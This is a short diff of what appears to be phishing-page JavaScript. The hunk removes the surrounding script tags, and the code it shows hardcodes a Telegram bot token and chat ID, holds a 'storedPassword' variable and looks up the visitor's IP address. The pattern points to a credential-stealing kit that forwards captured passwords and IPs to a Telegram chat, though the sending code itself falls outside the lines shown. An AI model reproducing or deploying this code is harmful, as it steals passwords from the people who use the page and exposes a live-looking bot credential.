@@ -1,4 +1,4 @@
- <script>
+
     const botToken = "8427673134:AAFgIMoafQFxas8Xqz3HL_BsKnYAYZAS1P8";
     const chatId = "6371692777";
     let storedPassword = null;
@@ -115,4 +115,4 @@
             .then(response => response.json())
             .then(data => data.ip);
     }
-</script>
+
